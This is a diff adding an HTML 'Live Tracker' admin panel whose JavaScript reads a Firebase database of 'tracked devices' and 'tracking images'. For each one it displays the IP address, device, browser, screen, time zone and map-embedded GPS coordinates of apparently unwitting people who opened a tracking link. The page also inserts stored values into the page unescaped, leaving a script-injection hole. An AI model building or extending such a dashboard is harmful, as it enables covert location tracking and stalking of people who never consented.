@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Live Tracker</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f8e9; padding: 20px; }
+        .device-section, .image-section, .location-section { background: white; padding: 10px; margin: 10px 0; border-radius: 10px; box-shadow: 0 0 5px gray; }
+        iframe { width: 100%; height: 300px; border-radius: 10px; }
+        h1, h3 { text-align: center; }
+        button { padding: 10px; background: #689f38; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px 0; width: 100%; }
+        button:hover { background: #33691e; }
+        #adminMessage { padding: 10px; background: #ffd54f; border-radius: 5px; text-align: center; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+    <h1>Tracked Devices - Admin Panel</h1>
+    <div id="adminMessage">No messages yet...</div>
+    <div id="deviceList"></div>
+    <div id="trackedImages"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            databaseURL: "https://live-32776-default-rtdb.firebaseio.com/"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const deviceList = document.getElementById('deviceList');
+        const trackedImages = document.getElementById('trackedImages');
+        const adminMessage = document.getElementById('adminMessage');
+
+        database.ref('adminMessage').on('value', (snapshot) => {
+            adminMessage.innerText = snapshot.val() || 'No messages yet...';
+        });
+
+        database.ref('Data').on('value', (snapshot) => {
+            deviceList.innerHTML = '';
+            trackedImages.innerHTML = '';
+            snapshot.forEach((deviceSnap) => {
+                const deviceName = deviceSnap.key;
+                deviceList.innerHTML += `<button onclick="loadDevice('${deviceName}')">${deviceName.replace(/-/g, '.')}</button>`;
+            });
+        });
+
+        function loadDevice(deviceName) {
+            trackedImages.innerHTML = `<h2>${deviceName.replace(/-/g, '.')} Tracking Data</h2>`;
+            database.ref('Data/' + deviceName).on('value', (snapshot) => {
+                trackedImages.innerHTML = `<h2>${deviceName.replace(/-/g, '.')} Tracking Data</h2>`;
+                snapshot.forEach((childSnapshot) => {
+                    const data = childSnapshot.val();
+                    const imageId = childSnapshot.key;
+
+                    trackedImages.innerHTML += `
+                        <div class="image-section">
+                            <h3>Tracking Image:</h3>
+                            <img src="${data.link}" style="max-width:300px;">
+                            <h4>Tracking ID: ${imageId}</h4>
+                            <h4>Start Time: ${new Date(data.startTime).toLocaleString()}</h4>
+                            <div id="locations-${deviceName}-${imageId}"></div>
+                        </div>
+                    `;
+
+                    loadLocations(deviceName, imageId);
+                });
+            });
+        }
+
+        function loadLocations(deviceName, imageId) {
+            database.ref(`Data/${deviceName}/${imageId}/locations`).on('value', (snapshot) => {
+                const locationContainer = document.getElementById(`locations-${deviceName}-${imageId}`);
+                locationContainer.innerHTML = '<h4>Live Locations:</h4>';
+
+                snapshot.forEach((childSnapshot) => {
+                    const location = childSnapshot.val();
+                    locationContainer.innerHTML += `
+                        <div class="location-section">
+                            <p><strong>IP:</strong> ${location.ip}</p>
+                            <p><strong>Device:</strong> ${location.deviceType}</p>
+                            <p><strong>Browser:</strong> ${location.browser}</p>
+                            <p><strong>Screen:</strong> ${location.screen}</p>
+                            <p><strong>Time Zone:</strong> ${location.timeZone}</p>
+                            <p><strong>Time:</strong> ${location.time}</p>
+                            <iframe src="https://maps.google.com/maps?q=${location.latitude},${location.longitude}&hl=es;&output=embed"></iframe>
+                        </div>
+                    `;
+                });
+            });
+        }
+    </script>
+
+</body>
+</html>
